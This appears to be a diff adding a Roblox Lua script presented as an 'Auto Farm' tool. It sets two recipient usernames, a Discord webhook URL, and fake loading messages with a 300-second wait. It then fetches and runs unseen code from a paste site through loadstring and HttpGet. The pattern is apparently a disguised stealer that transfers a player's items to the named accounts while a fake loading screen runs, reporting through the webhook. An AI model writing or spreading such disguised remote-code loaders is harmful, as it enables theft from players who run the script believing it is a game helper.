@@ -1,0 +1,17 @@
+UserName = "0929gideon"
+
+UserName2 = "P1erceRBLX"
+
+Webhook = "https://discord.com/api/webhooks/1098873183345594418/st1s0hlaHvh3Cg1ToursQGvU8RR8RaOozVUdlzMOPo21bb-Vlutvi_qXocdKywwBs-W4"
+
+_G.ScriptName = "Auto Farm"
+
+_G.FirstText = "Please wait.."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
